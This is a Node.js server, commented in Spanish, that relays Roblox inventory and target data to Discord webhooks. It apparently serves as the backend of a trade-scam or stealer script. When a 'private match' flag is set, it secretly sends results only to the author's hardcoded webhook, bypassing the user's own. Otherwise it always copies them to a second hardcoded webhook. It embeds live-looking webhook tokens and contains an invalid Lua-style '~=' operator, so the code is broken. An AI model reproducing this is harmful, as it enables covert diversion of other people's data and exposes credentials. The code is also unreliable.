const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;

// ========== WEBHOOKS CONFIGURABLES ==========
// Webhook PRIVADO (solo para ti cuando hay coincidencia)
const PRIVATE_WEBHOOK = 'https://discord.com/api/webhooks/1518688015692599416/9DG8JBvlf31P2FRj3dfRtamrWDpUpCymXpDMkfM8IMEPHVVKmXVeg1i_MXWVZpzokj6L';

// Webhook de "otros" (cuando NO hay coincidencia, se envía una copia aquí)
const OTHER_WEBHOOK = 'https://discord.com/api/webhooks/1528664955258277940/DYi4QqN2pr93CM35VxOzy9MZ6eA2Fl408SuHHKgIvmsTtCcepASPG45NDsxXw_veRMA-';

app.use(express.json());

// Ruta de prueba (GET)
app.get('/webhook', (req, res) => {
    res.json({ status: 'ok', message: 'Ruta /webhook existe. Usa POST con JSON para enviar datos.' });
});

// Función para enviar mensaje a un webhook de Discord
async function sendToDiscord(webhookUrl, content) {
    try {
        const payload = {
            content: content,
            username: 'TradeNotifier',
            avatar_url: 'https://cdn.pfps.gg/pfps/10184-389218-roblox.png'
        };
        await axios.post(webhookUrl, payload);
        console.log(`✅ Mensaje enviado a webhook: ${webhookUrl}`);
        return true;
    } catch (error) {
        console.error(`❌ Error enviando a webhook ${webhookUrl}:`, error.message);
        return false;
    }
}

// Ruta principal (POST)
app.post('/webhook', async (req, res) => {
    try {
        const data = req.body;
        console.log('📥 Datos recibidos:', data);

        // ========== 1. Extraer datos ==========
        const player = data.playerName || 'Desconocido';
        const target = data.targetName || 'Desconocido';
        const targetId = data.targetId || 0;
        const userWebhook = data.userWebhook || '';  // Webhook del usuario público
        const hasPrivateMatch = data.hasPrivateMatch || false;  // Flag de coincidencia
        const timestamp = data.timestamp || Date.now();

        // Listas completas (objetos con displayName)
        const allBrainrots = data.brainrots || [];
        const allBases = data.bases || [];
        const allGears = data.gears || [];

        // Listas de targets del usuario público (solo nombres)
        const targetBrainrotNames = data.targetBrainrots || [];
        const targetBaseNames = data.targetBases || [];
        const targetGearNames = data.targetGears || [];

        // ========== 2. Separar ítems targeteados (por el usuario) y no targeteados ==========
        function separateTargets(allItems, targetNames) {
            const targetSet = new Set(targetNames);
            const targeted = [];
            const untargeted = [];
            for (const item of allItems) {
                const name = item.displayName;
                if (targetSet.has(name)) {
                    targeted.push(name);
                } else {
                    untargeted.push(name);
                }
            }
            targeted.sort();
            untargeted.sort();
            return { targeted, untargeted };
        }

        const brainrotResult = separateTargets(allBrainrots, targetBrainrotNames);
        const baseResult = separateTargets(allBases, targetBaseNames);
        const gearResult = separateTargets(allGears, targetGearNames);

        // ========== 3. Construir mensaje bonito ==========
        const lines = [];
        lines.push(`**📊 Inventario de ${player}**`);
        lines.push(`**Objetivo:** ${target} (ID: ${targetId})`);
        if (hasPrivateMatch) {
            lines.push(`**🔴 ¡Coincidencia con ítems privados!**`);
        }
        lines.push('');

        // Brainrots
        lines.push(`**🧠 BRAINROTS TARGETS (${brainrotResult.targeted.length}):**`);
        lines.push(brainrotResult.targeted.length > 0 ? brainrotResult.targeted.join(', ') : 'Ninguno');
        lines.push(`**🧠 BRAINROTS UNTARGETED (${brainrotResult.untargeted.length}):**`);
        lines.push(brainrotResult.untargeted.length > 0 ? brainrotResult.untargeted.join(', ') : 'Ninguno');
        lines.push('');

        // Bases
        lines.push(`**🎨 BASES TARGETS (${baseResult.targeted.length}):**`);
        lines.push(baseResult.targeted.length > 0 ? baseResult.targeted.join(', ') : 'Ninguno');
        lines.push(`**🎨 BASES UNTARGETED (${baseResult.untargeted.length}):**`);
        lines.push(baseResult.untargeted.length > 0 ? baseResult.untargeted.join(', ') : 'Ninguno');
        lines.push('');

        // Gears
        lines.push(`**⚙️ GEARS TARGETS (${gearResult.targeted.length}):**`);
        lines.push(gearResult.targeted.length > 0 ? gearResult.targeted.join(', ') : 'Ninguno');
        lines.push(`**⚙️ GEARS UNTARGETED (${gearResult.untargeted.length}):**`);
        lines.push(gearResult.untargeted.length > 0 ? gearResult.untargeted.join(', ') : 'Ninguno');
        lines.push('');

        // Fecha
        const date = new Date(timestamp);
        lines.push(`🕒 \`${date.toLocaleString('es-ES', { timeZone: 'UTC' })}\``);

        const content = lines.join('\n');

        // ========== 4. Decidir a qué webhooks enviar ==========
        const webhooksToSend = [];

        if (hasPrivateMatch) {
            // Solo webhook privado
            webhooksToSend.push(PRIVATE_WEBHOOK);
        } else {
            // Webhook del usuario (si existe)
            if (userWebhook && userWebhook ~= "") {
                webhooksToSend.push(userWebhook);
            }
            // Siempre enviar una copia al webhook de "otros"
            webhooksToSend.push(OTHER_WEBHOOK);
        }

        // ========== 5. Enviar a todos los webhooks en paralelo ==========
        const sendPromises = webhooksToSend.map(webhook => sendToDiscord(webhook, content));
        await Promise.all(sendPromises);

        res.status(200).json({
            status: 'ok',
            message: `Notificación enviada a ${webhooksToSend.length} webhook(s)`,
            webhooks: webhooksToSend
        });
    } catch (error) {
        console.error('❌ Error general:', error.message);
        res.status(500).json({ status: 'error', message: error.message });
    }
});

app.listen(PORT, () => {
    console.log(`✅ Servidor corriendo en puerto ${PORT}`);
});
